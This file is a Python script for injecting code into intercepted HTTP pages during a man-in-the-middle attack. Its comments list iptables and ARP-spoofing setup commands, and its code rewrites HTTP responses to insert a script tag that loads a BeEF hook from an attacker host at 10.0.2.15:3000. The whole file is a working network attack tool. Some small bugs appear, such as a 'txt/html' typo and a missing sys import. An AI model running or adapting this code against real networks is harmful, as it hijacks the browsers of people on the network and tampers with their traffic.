#!/usr/bin/env python
# Description: This program inject code in http pages.
#
# Install Beef if neeeded (beef, toor) and use a webserver.
# sudo pip install netfilterqueue               --> Install netfilterqueue
# echo 1 > /proc/sys/net/ipv4/ip_forward        --> Ip forwarding for mitm.
# iptables -I FORWARD -j NFQUEUE --queue-num 0  --> For mitm. Trap all the packets that usually goes to the forward chain if it is are in the netfilter queue with queue number 0.
# iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> Use this and the next command instead if we are testing it in our own computer.
# iptables -I INPUT -j NFQUEUE --queue-num 0    
# python arp_spoof.py -t <target's ip> -s <router's ip>     --> Arp poisoning for mitm.
# (iptables --flush                             --> back to normal)
#
# Usage:  python code_injector.py 
# Usage: python3 code_injector.py 
import netfilterqueue
import scapy.all as scapy
import re


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    # Converting packet to a scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):      
        # try:                                               python3 
            # load = scapy_packet[scapy.Raw].load.decode()   python3 
            load = scapy_packet[scapy.Raw].load  
            if scapy_packet[scapy.TCP].dport == 80:      
                print("[+] Request")
                # Delete Accept-Encoding and its content to get it in plain text
                load = re.sub("Accept-Encoding:.*?\\r\\n","", load)
            elif scapy_packet[scapy.TCP].sport == 80:
                print("[+] Response")
                injection_code = '<script src="http://10.0.2.15:3000/hook.js"></script>'            
                load = load.replace("</head>", injection_code + "</head>")
                # The new load make its content-length bigger so we need to change it
                content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
                if content_length_search and "txt/html" in load:
                    print("Old content_length: " + str(content_length_search.group(1)))
                    content_length = content_length_search.group(1)
                    new_content_length = int(content_length) + len(injection_code)
                    load = load.replace(content_length, str(new_content_length))
                    print("New content_length: " + str(new_content_length))
            if load != scapy_packet[scapy.Raw].load:
                new_packet = set_load(scapy_packet, load)
                # packet.set_payload(bytes(new_packet))     python3
                packet.set_payload(str(new_packet))         
        # except UnicodeDecodeError python3
            # pass                  python3

    packet.accept()


def main():
    global ack_list
    ack_list = []

    try:    
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        print("\n[+] Detected CTRL+C -> Quitting")
        sys.exit(0)


if __name__ == "__main__":
    main()